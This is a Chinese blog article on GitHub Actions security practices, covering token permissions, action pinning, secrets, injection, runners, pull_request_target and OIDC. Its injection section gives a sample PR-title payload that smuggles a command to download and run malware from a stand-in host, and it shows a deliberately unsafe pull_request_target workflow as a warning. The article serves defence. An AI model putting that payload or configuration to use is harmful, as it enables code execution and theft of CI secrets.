---
来源: 博客
原始链接: https://www.163.com/dy/article/HHKBV1OE0553SRCA.html
---

# GitHub Actions 安全最佳实践

> GitHub Actions 是一个越来越受欢迎的 CI/CD 平台。它们提供强大且易于访问的功能，但需要特别注意以避免任何安全妥协。本文涵盖凭证最小权限、第三方 Action 安全、密钥管理、注入攻击防护、Runner 加固、pull_request_target 风险以及 OIDC 云认证等核心安全议题。

---

## 一、凭证最小权限原则（GITHUB_TOKEN）

### 什么是 GITHUB_TOKEN

GITHUB_TOKEN 授予每个运行器与存储库交互的权限。它是**临时的**，有效期仅在工作流开始和结束之间。

### 默认权限

| 模式 | 描述 |
|------|------|
| 允许（默认） | 大多数范围读/写权限 |
| 受限 | 默认大多数范围无权限 |
| 分叉 Repo | 最多只有 read-access |

### 安全配置

始终授予 GITHUB_TOKEN **执行工作流/作业所需的最低权限**：

```yaml
permissions:
  contents: read    # 仅读权限
  pull-requests: write
  issues: read
  actions: read
```

### 环境变量作用域

- **Step 级别**：仅当前步骤可访问 ✅（推荐）
- **Job 级别**：所有步骤共享，包含可能受损的代码 ❌

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # ✅ 推荐：Step 级别
      - name: Deploy
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: ./deploy.sh
```

---

## 二、使用特定的 Action 版本标签

### 风险场景

使用第三方 Action 时，如果作者推送了恶意更新，你的密钥和环境变量可能被窃取：

```yaml
# ❌ 危险：使用标签（如 @v1）
- name: Lint code
  uses: someperson/lint-action@v1

# ✅ 安全：使用完整提交哈希
- name: Lint code
  uses: someperson/lint-action@f054a8b539a109f9f41c372932f1ae047eff08c9

# ✅ 安全：使用 Docker 镜像哈希
- name: Log in to container registry
  uses: docker/login-action@f054a8b539a109f9f41c372932f1ae047eff08c9
```

### 推荐做法

- 优先使用 **完整提交 SHA** 引用第三方 Action
- 不要依赖标签（tag）——它可以被重新标记
- 定期审计工作流中的 Action 版本

---

## 三、密钥管理

### ❌ 禁止纯文本存储密钥

```yaml
# ❌ 错误：明文密钥
env:
  API_KEY: "sk-xxxxxxx"

# ✅ 正确：使用 GitHub Secrets
env:
  API_KEY: ${{ secrets.API_KEY }}
```

### 使用 ggshield-action 扫描密钥

在 CI 工作流中自动扫描源代码中的密钥泄露：

```yaml
- name: Run GitGuardian Security Scanning
  uses: GitGuardian/ggshield-action@v3
```

### GitHub Secrets 最佳实践

- 所有 API 密钥、令牌、密码存入 GitHub Secrets
- 定期轮换密钥
- 限制 Secrets 访问范围（仓库 > 组织）
- 不要在日志中打印 Secrets

---

## 四、防范注入攻击

### 危险：不引用不可控值

PR 标题/正文/Issue 内容由提交者控制，直接拼入命令可导致 RCE：

```yaml
# ❌ 危险：直接引用 PR 标题
- name: lint
  run: |
    echo "${{github.event.pull_request.title}}" | commitlint

# 恶意 PR 标题可注入：
# a" && wget https://example.com/malware && ./malware && echo "
```

### 防御方案一：使用 Action 代替内联脚本

Action 将不可信值作为参数传入，自动中和注入攻击：

```yaml
# ✅ 使用 Action 包装
- uses: fakeaction/checktitle@v3
  with:
    title: ${{ github.event.pull_request.title }}
```

### 防御方案二：使用中间环境变量

```yaml
# ✅ 中间环境变量 + 双引号包裹
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "$PR_TITLE"
```

### 不受信任的值列表

| 不受信任 | 说明 |
|---------|------|
| `github.event.pull_request.title` | PR 标题 |
| `github.event.pull_request.body` | PR 正文 |
| `github.event.issue.title` | Issue 标题 |
| `github.event.issue.body` | Issue 正文 |

---

## 五、在可信代码上运行工作流

### 默认保护机制

- 首次贡献者的 PR 需要维护者**批准后才能运行 CI**
- GitHub 不允许公开仓库使用个人账户自托管运行器

### 安全建议

1. **批准前先阅读所有提交的代码**
2. **启用更严格的设置**：要求所有外部协作者都需批准

```yaml
# 在仓库设置中启用：
# Settings → Actions → Require approval for first-time contributors
```

3. **警惕测试中的恶意代码**：提交 PR 时可能在测试用例中植入挖矿程序

---

## 六、强化 Action Runners

### 公共仓库：绝对不要用自托管 Runner

> ⚠️ 将自托管 Runner 用于公开仓库，等于允许任何人提交恶意代码逃逸沙箱、访问网络。

### 自托管 Runner 安全加固（适用于私有仓库）

```yaml
# 1. 专用低权限账户
# 使用非特权账户 "github-runner" 启动 Runner

# 2. 禁止 sudo
# 仅允许 Runner 进程所需的最小权限

# 3. 临时隔离工作负载
# 使用 Kubernetes Pod 或容器执行作业
# 工作流完成后销毁虚拟机

# 4. 日志与监控
# 部署 EDR 代理（如 Linux Sysmon）
# 设置检测规则，异常时自动告警
```

---

## 七、pull_request_target 触发器风险

### 什么是 pull_request_target

| 触发器 | 运行上下文 | Token 权限 |
|--------|-----------|-----------|
| `pull_request` | fork 仓库（提交者） | **无写入权限，无 Secrets** |
| `pull_request_target` | 目标仓库（维护者） | **有写入权限，有 Secrets** |

### 漏洞示例

```yaml
# ❌ 危险配置
name: my action
on: pull_request_target  # 在目标仓库上下文中运行
jobs:
  pr-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      # ⚠️ 此时执行的是 fork 中的代码！
      - run: pip install -r requirements.txt
        # 恶意代码可在 pip install 时植入后门
```

### 安全建议

> **强烈建议不要使用 `pull_request_target`。**
> 如必须使用，绝对不要 checkout fork 中的代码。

```yaml
# ✅ 替代方案：使用合并后的代码
on: pull_request
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.base.sha }}
          # base = 目标分支，安全
```

---

## 八、使用 OpenID Connect（OIDC）进行云认证

### 为什么不用长期密钥

- 密钥泄露风险
- 难以轮换
- 权限无法精细化

### OIDC 工作原理

```
工作流 → 请求 → 云 Provider → JWT（含声明） → 验证 → 短期访问令牌
```

### GitHub + AWS 配置示例

```yaml
- name: Configure AWS Credentials
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
    aws-region: us-east-1
```

### OIDC 优势

- ✅ 无需在 GitHub 中存储长期密钥
- ✅ 云端细粒度访问控制
- ✅ 自动化的短时令牌生命周期
- ✅ 支持跨云和 SSO 场景

---

## 九、安全检查清单

| # | 检查项 | 优先级 |
|---|--------|--------|
| 1 | GITHUB_TOKEN 配置为最小权限 | 🔴 必须 |
| 2 | 使用提交 SHA 而非标签引用第三方 Action | 🔴 必须 |
| 3 | 所有密钥存入 GitHub Secrets | 🔴 必须 |
| 4 | 不直接引用 PR/Issue 的不可控文本 | 🔴 必须 |
| 5 | 公开仓库不使用自托管 Runner | 🔴 必须 |
| 6 | CI 中集成 ggshield 扫描密钥泄露 | 🟡 推荐 |
| 7 | 首次贡献者 PR 需批准后才能运行 | 🟡 推荐 |
| 8 | 优先使用 OIDC 替代长期密钥 | 🟡 推荐 |
| 9 | pull_request_target 不 checkout fork 代码 | 🔴 必须 |
| 10 | Runner 使用低权限账户和临时隔离 | 🟡 推荐 |

---

## 十、供应链攻击防护总结

| 攻击面 | 防御措施 |
|--------|---------|
| 第三方 Action | 使用完整 SHA 引用，监控版本更新 |
| 密钥泄露 | GitHub Secrets + CI 扫描 |
| 注入攻击 | 环境变量 + Action 封装 |
| 恶意测试 | 首次贡献者批准制度 |
| pull_request_target | 避免使用，不 checkout fork 代码 |
| Runner 安全 | 不用于公开仓库，低权限 + 隔离 |
| 云凭证 | OIDC 短期令牌替代长期密钥 |
